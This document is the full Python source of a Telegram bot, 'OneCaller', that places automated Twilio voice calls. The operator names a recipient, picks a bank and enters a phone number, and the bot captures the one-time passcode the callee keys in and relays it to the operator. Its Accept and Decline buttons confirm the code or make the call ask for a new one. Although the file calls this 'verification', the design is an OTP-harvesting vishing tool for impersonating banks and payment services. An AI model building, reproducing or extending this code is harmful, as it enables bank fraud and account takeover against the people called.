#main
import os
import logging
import sys
import signal
import time
import telebot
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse
import phonenumbers
from dotenv import load_dotenv
import redis
from urllib.parse import urlparse
from pathlib import Path
from payment_handler import PaymentHandler

# Configure logging first
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('bot.log')
    ]
)

# Load environment variables from multiple possible locations
def load_environment():
    # Try to load from .env file
    env_path = Path('.env')
    load_dotenv(dotenv_path=env_path)

    # Log environment variable status
    required_vars = [
        'TELEGRAM_BOT_TOKEN',
        'TWILIO_ACCOUNT_SID',
        'TWILIO_AUTH_TOKEN',
        'TWILIO_PHONE_NUMBER',
        'TWILIO_FUNCTION_URL',
        'REDIS_URL'
    ]

    missing_vars = []
    for var in required_vars:
        if not os.getenv(var):
            missing_vars.append(var)
            logging.error(f"{var} not found in environment variables!")

    if missing_vars:
        logging.error(f"Missing required environment variables: {', '.join(missing_vars)}")
        return False

    logging.info("All required environment variables loaded successfully")
    return True

# Load environment variables
if not load_environment():
    logging.error("Failed to load required environment variables. Exiting...")
    sys.exit(1)

# Initialize your bot and other variables only after environment is loaded
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
ACCOUNT_SID = os.getenv("TWILIO_ACCOUNT_SID")
AUTH_TOKEN = os.getenv("TWILIO_AUTH_TOKEN")
TWILIO_PHONE_NUMBER = os.getenv("TWILIO_PHONE_NUMBER")
TWILIO_FUNCTION_URL = os.getenv("TWILIO_FUNCTION_URL")
REDIS_URL = os.getenv("REDIS_URL")
REDIS_SOCKET_TIMEOUT = 5

# Initialize bot at module level
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Initialize payment handler
payment_handler = PaymentHandler(bot)
payment_handler.add_payment_handlers()

# User state storage with call tracking
user_states = {}
active_calls = {}

# Bank options
BANK_OPTIONS = [
    "JPMorgan Chase", "Citibank", "Goldman Sachs", "TD Bank", "Citizens Bank",
    "Morgan Stanley", "KeyBank", "Bank of America", "U.S. Bank", "Truist",
    "BMO Harris", "Fifth Third Bank", "Huntington", "Ally Bank", "Wells Fargo",
    "PNC Bank", "Capital One", "First Citizens", "M&T Bank", "American Express", "Paypal", "Coinbase"
]

BANKS_PER_PAGE = 8

status_emojis = {
    'queued': '⏳',
    'ringing': '🔔',
    'in-progress': '📞',
    'completed': '✅',
    'busy': '⏰',
    'failed': '❌',
    'no-answer': '📵',
    'canceled': '🚫'
}

def create_bank_keyboard(page=0):
    """Create inline keyboard for bank selection with pagination."""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    start_index = page * BANKS_PER_PAGE
    end_index = start_index + BANKS_PER_PAGE

    banks_page = BANK_OPTIONS[start_index:end_index]

    for bank in banks_page:
         markup.add(telebot.types.InlineKeyboardButton(bank, callback_data=f"bank_{bank}"))

    nav_buttons = []
    if page > 0:
      nav_buttons.append(telebot.types.InlineKeyboardButton("⬅️ Back", callback_data=f"banks_page_{page-1}"))
    if end_index < len(BANK_OPTIONS):
      nav_buttons.append(telebot.types.InlineKeyboardButton("Next ➡️", callback_data=f"banks_page_{page+1}"))

    if nav_buttons:
        markup.row(*nav_buttons)

    return markup

def create_cancel_call_keyboard(call_sid):
    """Create inline keyboard to cancel an active call."""
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("⏹️ End Call", callback_data=f"cancel_call_{call_sid}"))
    return markup

def create_hangup_keyboard(call_sid):
    """Create inline keyboard to hangup the call"""
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("⏹️ Hangup", callback_data=f"hangup_{call_sid}"))
    return markup


@bot.message_handler(commands=['start'])
def send_welcome(message):
    """Handle /start command."""
    welcome_text = (
        "🎯 Welcome to *OneCaller*!\n\n"
        "I can help you verify phone numbers through voice calls.\n\n"
        "🏦 This service is designed to enhance account security by delivering OTP codes via a secure voice call\n\n"
        "📱 Features:\n"
        "• Secure voice call verification\n"
        "• Real-time call status updates\n"
        "• Automatic OTP collection\n\n"
        "Select an option to begin:"
    )
    bot.send_message(
        message.chat.id,
        welcome_text,
        parse_mode="Markdown",
        reply_markup=payment_handler.create_main_menu_keyboard()
    )

def update_call_status(chat_id, status_msg, call_sid=None):
    """Update user about call status and store in active_calls."""
    if call_sid:
        active_calls[chat_id] = {
            'call_sid': call_sid,
            'status': status_msg,
            'timestamp': time.time()
        }

    status_icons = {
        'ringing': '🔔',
        'in-progress': '📞',
        'completed': '✅',
        'failed': '❌',
        'busy': '⏰',
        'no-answer': '📵'
    }

    icon = next((icon for status, icon in status_icons.items() if status in status_msg.lower()), '🔄')
    bot.send_message(chat_id, f"{icon} {status_msg}")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    """Handle inline keyboard callbacks with enhanced status reporting."""
    chat_id = call.message.chat.id

    if call.data == "start_verification":
        if not payment_handler.handle_start_verification(call):
            return
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "👤 Enter the name of the call recipient:"
        )
        user_states[chat_id] = "awaiting_recipient_name"
    elif call.data == "return_menu":
        bot.answer_callback_query(call.id)
        send_welcome(call.message)
    elif call.data == "show_plans":
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "💎 Choose a subscription plan:",
            reply_markup=payment_handler.create_subscription_keyboard()
        )    
    elif call.data.startswith("verify_accept_"):
        call_sid = call.data.split("_")[2]
        handle_verification_accept(chat_id, call_sid, call.message.message_id)
    
    elif call.data.startswith("verify_decline_"):
        call_sid = call.data.split("_")[2]
        handle_verification_decline(chat_id, call_sid, call.message.message_id)
    
    elif call.data.startswith("hangup_"):
        call_sid = call.data.split("_")[1]
        handle_hangup(chat_id, call_sid)

    elif call.data == "help":
        bot.answer_callback_query(call.id)
        help_text = (
            "📌 *OneCaller Guide*\n\n"
            "1️⃣ Click 'Start Call'\n"
            "2️⃣ Enter recipient's name\n"
            "3️⃣ Select the specific bank\n"
            "4️⃣ Enter phone number with country code\n"
            "📞 *Call Status Icons:*\n"
            "🔔 Ringing\n"
            "📞 In Progress\n"
            "✅ Completed\n"
            "❌ Failed\n"
            "⏰ Busy\n"
            "📵 No Answer\n\n"
        )
        bot.send_message(chat_id, help_text, parse_mode="Markdown")

    elif call.data == "status":
        bot.answer_callback_query(call.id)
        if chat_id in active_calls:
            call_info = active_calls[chat_id]
            status_text = (
                "📊 *Current Call Status*\n\n"
                f"Call ID: `{call_info['call_sid']}`\n"
                f"Status: {call_info['status']}\n"
                f"Started: {time.strftime('%H:%M:%S', time.localtime(call_info['timestamp']))}"
            )
            bot.send_message(chat_id, status_text, parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "No active calls found.")

    elif call.data.startswith("cancel_call_"):
        call_sid = call.data.split("_")[2]
        bot.answer_callback_query(call.id, text="Cancelling call...")
        handle_cancel_call(chat_id, call_sid)

    elif call.data == "cancel":
        bot.answer_callback_query(call.id)
        if chat_id in user_states:
            del user_states[chat_id]
        if chat_id in active_calls:
            del active_calls[chat_id]
        bot.send_message(
            chat_id,
            "❌ Operation cancelled. Send /start to begin again."
        )

    elif call.data.startswith("bank_"):
       bank_name = call.data[5:]
       bot.answer_callback_query(call.id, text=f"Selected: {bank_name}")
       if isinstance(user_states.get(chat_id),dict):
           user_states[chat_id]["state"] = "awaiting_phone"
           user_states[chat_id]["bank"] = bank_name
       else:
           user_states[chat_id] = {"state":"awaiting_phone", "bank":bank_name}
       bot.send_message(
           chat_id,
            "📱 Enter the phone number to verify:\n"
            "Format: +[country_code][number]\n"
            "Example: +15017122661"
       )

    elif call.data.startswith("banks_page_"):
        page = int(call.data.split("_")[2])
        bot.answer_callback_query(call.id)
        bot.edit_message_reply_markup(
            chat_id=chat_id,
            message_id=call.message.message_id,
            reply_markup=create_bank_keyboard(page)
        )

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    """Handle all text messages with enhanced status updates."""
    chat_id = message.chat.id

    if chat_id not in user_states:
        bot.send_message(
            chat_id,
            "⚠️ Please use /start to begin verification.",
            reply_markup=payment_handler.create_main_menu_keyboard()
        )
        return

    if user_states[chat_id] == "awaiting_recipient_name":
        user_states[chat_id] = {"state":"awaiting_bank", "recipient_name":message.text.strip()}
        bot.send_message(chat_id, "🏦 Select the banking institution:", reply_markup=create_bank_keyboard())

    elif isinstance(user_states[chat_id], dict) and user_states[chat_id].get("state") == "awaiting_bank":
        bot.send_message(chat_id, "🏦 Select the banking institution:", reply_markup=create_bank_keyboard())

    elif isinstance(user_states[chat_id], dict) and user_states[chat_id].get("state") == "awaiting_phone":
       handle_phone_number(message,user_states[chat_id].get("recipient_name"),user_states[chat_id].get("bank"),None)

def handle_phone_number(message, recipient_name, bank_name, service_name):
    chat_id = message.chat.id
    phone_number = message.text.strip()

    if not validate_phone_number(phone_number):
        bot.send_message(
            chat_id,
            "❌ Invalid phone number format.\n"
            "Please use international format: +[country_code][number]"
        )
        return

    status_message = bot.send_message(
        chat_id,
        "🔄 Initiating verification call..."
    )

    redis_client = create_redis_client()
    if redis_client is None:
        bot.edit_message_text(
            "❌ Redis connection failed. Please try again.",
            chat_id=chat_id,
            message_id=status_message.message_id
        )
        return

    try:
        # Initialize Twilio client first
        client = Client(ACCOUNT_SID, AUTH_TOKEN)
        
        # Create a unique call identifier
        temp_call_id = f"temp_{int(time.time())}"
        
        # Store the data in Redis FIRST
        redis_client.hset(f'call_info:{temp_call_id}', mapping={
            'recipient_name': recipient_name, 
            'bank_name': bank_name,
            'phone_number': phone_number  # Store phone number in Redis
        })
        
        # Initialize TwiML
        response = VoiceResponse()
        response.redirect(f"{TWILIO_FUNCTION_URL}?temp_id={temp_call_id}")
        
        call = client.calls.create(
            to=phone_number,
            from_=TWILIO_PHONE_NUMBER,
            twiml=str(response),
            status_callback=TWILIO_FUNCTION_URL,
            status_callback_event=["initiated", "ringing", "answered", "completed"]
        )
        
        # Copy data to the correct key with CallSid
        redis_client.hset(f'call_info:{call.sid}', mapping={
            'recipient_name': recipient_name, 
            'bank_name': bank_name,
            'phone_number': phone_number
        })
        
        redis_client.delete(f'call_info:{temp_call_id}')

        def create_verification_keyboard(call_sid):
            markup = telebot.types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                telebot.types.InlineKeyboardButton("✅ Accept", callback_data=f"verify_accept_{call_sid}"),
                telebot.types.InlineKeyboardButton("❌ Decline", callback_data=f"verify_decline_{call_sid}"),
                telebot.types.InlineKeyboardButton("⏹️ Hangup", callback_data=f"hangup_{call_sid}")
            )
            return markup

        max_wait_time = 120
        start_time = time.time()
        call_status = call.status
        last_status = None
        otp_code = None
        otp_displayed = False

        while time.time() - start_time <= max_wait_time and call_status not in ['completed', 'busy', 'failed', 'no-answer', 'canceled']:
            try:
                call = client.calls(call.sid).fetch()
                call_status = call.status

                # Check for OTP code
                if not otp_displayed:
                    otp_code = redis_client.get(f"otp:{call.sid}")
                    if otp_code:
                        verification_text = (
                            f"📱 *Verification Code Received*\n\n"
                            f"👤 Recipient: `{recipient_name}`\n"
                            f"🏦 Bank: `{bank_name}`\n"
                            f"📱 Number: `{phone_number}`\n"
                            f"🔑 Code: `{otp_code}`\n"
                            f"🕒 Time: {time.strftime('%H:%M:%S')}"
                        )
                        bot.edit_message_text(
                            verification_text,
                            chat_id=chat_id,
                            message_id=status_message.message_id,
                            parse_mode="Markdown",
                            reply_markup=create_verification_keyboard(call.sid)
                        )
                        otp_displayed = True
                        redis_client.delete(f"otp:{call.sid}")

                # Update status display
                if call_status != last_status:
                    if call_status == 'completed':
                        # For completed status, show final verification details
                        final_text = (
                            f"📱 *Call Completed*\n\n"
                            f"👤 Recipient: `{recipient_name}`\n"
                            f"🏦 Bank: `{bank_name}`\n"
                            f"📱 Number: `{phone_number}`\n"
                            f"🔑 Final Code: `{otp_code if otp_code else 'Not provided'}`\n"
                            f"✅ Status: *Completed*\n"
                            f"🕒 Time: {time.strftime('%H:%M:%S')}"
                        )
                        bot.edit_message_text(
                            final_text,
                            chat_id=chat_id,
                            message_id=status_message.message_id,
                            parse_mode="Markdown"
                        )
                    else:
                        status_emoji = status_emojis.get(call_status, '🔄')
                        bot.edit_message_text(
                            f"📱 *Call Status Update*\n\n"
                            f"ID: `{call.sid}`\n"
                            f"Status: {status_emoji} *{call_status.title()}*\n"
                            f"Phone: `{phone_number}`\n"
                            f"Time: {time.strftime('%H:%M:%S')}",
                            chat_id=chat_id,
                            message_id=status_message.message_id,
                            parse_mode="Markdown",
                            reply_markup=create_hangup_keyboard(call.sid)
                        )
                    last_status = call_status

            except Exception as e:
                logging.error(f"Error fetching call status: {e}")
                continue

            time.sleep(2)
        
        if not otp_displayed:
            bot.edit_message_text(
                "⏱ Call verification timed out.",
                chat_id=chat_id,
                message_id=status_message.message_id
            )

    except Exception as e:
        bot.edit_message_text(
            f"❌ Error during verification: {str(e)}",
            chat_id=chat_id,
            message_id=status_message.message_id
        )
    finally:
        if redis_client:
            redis_client.close()

def handle_verification_accept(chat_id, call_sid, message_id):
    try:
        client = Client(ACCOUNT_SID, AUTH_TOKEN)
        call = client.calls(call_sid).update(
            twiml='<Response><Say voice="Polly.Joanna">Thank you for verifying your identity. Goodbye.</Say><Hangup/></Response>'
        )
        
        bot.edit_message_text(
            "✅ Verification accepted. Call completed.",
            chat_id=chat_id,
            message_id=message_id
        )
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error accepting verification: {str(e)}")

def handle_verification_decline(chat_id, call_sid, message_id):
    try:
        client = Client(ACCOUNT_SID, AUTH_TOKEN)
        redis_client = create_redis_client()
        if redis_client:
            # Clear the previous OTP
            redis_client.delete(f"otp:{call_sid}")

        # Update call with re-verification parameter
        call = client.calls(call_sid).update(
            url=f"{TWILIO_FUNCTION_URL}?isReverification=true",
            method='POST'
        )
        
        # Send initial message about requesting new code
        bot.edit_message_text(
            "🔄 Verification declined. Requesting new code...",
            chat_id=chat_id,
            message_id=message_id,
            reply_markup=create_hangup_keyboard(call_sid)
        )

        # Monitor for new OTP
        max_wait_time = 120
        start_time = time.time()
        otp_displayed = False

        while time.time() - start_time <= max_wait_time and not otp_displayed:
            try:
                if redis_client:
                    new_otp = redis_client.get(f"otp:{call_sid}")
                    if new_otp:
                        # Create verification keyboard
                        def create_verification_keyboard(call_sid):
                            markup = telebot.types.InlineKeyboardMarkup(row_width=2)
                            markup.add(
                                telebot.types.InlineKeyboardButton("✅ Accept", callback_data=f"verify_accept_{call_sid}"),
                                telebot.types.InlineKeyboardButton("❌ Decline", callback_data=f"verify_decline_{call_sid}"),
                                telebot.types.InlineKeyboardButton("⏹️ Hangup", callback_data=f"hangup_{call_sid}")
                            )
                            return markup

                        # Get call info for the message
                        call_info = redis_client.hgetall(f'call_info:{call_sid}')
                        
                        # Display new verification message
                        verification_text = (
                            f"📱 *New Verification Code Received*\n\n"
                            f"👤 Recipient: `{call_info.get('recipient_name', 'N/A')}`\n"
                            f"🏦 Bank: `{call_info.get('bank_name', 'N/A')}`\n"
                            f"🔑 Code: `{new_otp}`\n"
                            f"🕒 Time: {time.strftime('%H:%M:%S')}"
                        )
                        
                        bot.edit_message_text(
                            verification_text,
                            chat_id=chat_id,
                            message_id=message_id,
                            parse_mode="Markdown",
                            reply_markup=create_verification_keyboard(call_sid)
                        )
                        
                        # Clear the OTP from Redis
                        redis_client.delete(f"otp:{call_sid}")
                        otp_displayed = True
                        break

            except Exception as e:
                logging.error(f"Error monitoring re-verification: {e}")
                continue

            time.sleep(2)

        if not otp_displayed:
            bot.edit_message_text(
                "⏱ Re-verification timed out.",
                chat_id=chat_id,
                message_id=message_id
            )

    except Exception as e:
        bot.send_message(chat_id, f"❌ Error during re-verification: {str(e)}")
    finally:
        if redis_client:
            redis_client.close()

def handle_hangup(chat_id, call_sid):
    try:
        client = Client(ACCOUNT_SID, AUTH_TOKEN)
        call = client.calls(call_sid).update(status="completed")
        
        bot.send_message(chat_id, "📞 Call has been ended.")
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error hanging up call: {str(e)}")


def handle_cancel_call(chat_id, call_sid):
    """Handles cancellation of an ongoing call."""
    try:
        client = Client(ACCOUNT_SID, AUTH_TOKEN)
        call = client.calls(call_sid).fetch()
        if call.status not in ['completed', 'canceled','failed']:
            call.update(status='canceled')
            bot.send_message(chat_id, f"🚫 Call with ID `{call_sid}` has been cancelled.")
        else:
            bot.send_message(chat_id, f"⚠️ Call with ID `{call_sid}` is already {call.status}.")

        if chat_id in active_calls and active_calls[chat_id].get('call_sid') == call_sid:
            del active_calls[chat_id]
        if chat_id in user_states:
            del user_states[chat_id]
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error cancelling call `{call_sid}`: {str(e)}")

def validate_phone_number(phone_number):
    """Validates the format of a phone number."""
    try:
        parsed_number = phonenumbers.parse(phone_number)
        if not phonenumbers.is_valid_number(parsed_number):
            logging.error(f"Invalid phone number format: {phone_number}")
            return False

        logging.info(f"Phone number {phone_number} is valid")
        return True
    except phonenumbers.phonenumberutil.NumberParseException:
        logging.error(f"Error parsing phone number: {phone_number}")
        return False

def create_redis_client():
    """Create and return a Redis client with robust error handling."""
    try:
        if not REDIS_URL:
            logging.error("REDIS_URL environment variable is not set.")
            return None

        parsed_url = urlparse(REDIS_URL)
        if parsed_url.scheme != 'rediss':
            logging.error("REDIS_URL scheme must be 'rediss://' for Upstash Redis.")
            return None

        redis_client = redis.Redis.from_url(
            REDIS_URL,
            decode_responses=True,
            socket_timeout=REDIS_SOCKET_TIMEOUT,
            socket_connect_timeout=REDIS_SOCKET_TIMEOUT,
            retry_on_timeout=True,
            max_connections=20,
            ssl_cert_reqs=None
        )
        redis_client.ping()
        logging.info("Redis connection established successfully")
        return redis_client

    except Exception as e:
        logging.error(f"Redis connection error: {e}")
        return None

def signal_handler(signum, frame):
    """Handle shutdown gracefully."""
    logging.info("Shutting down bot...")
    print("\n👋 Bot shutdown requested. Cleaning up...")
    sys.exit(0)

# Register signal handlers
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# Start polling in the main thread
if __name__ == '__main__':
    logging.info("Starting bot polling...")
    bot.infinity_polling()
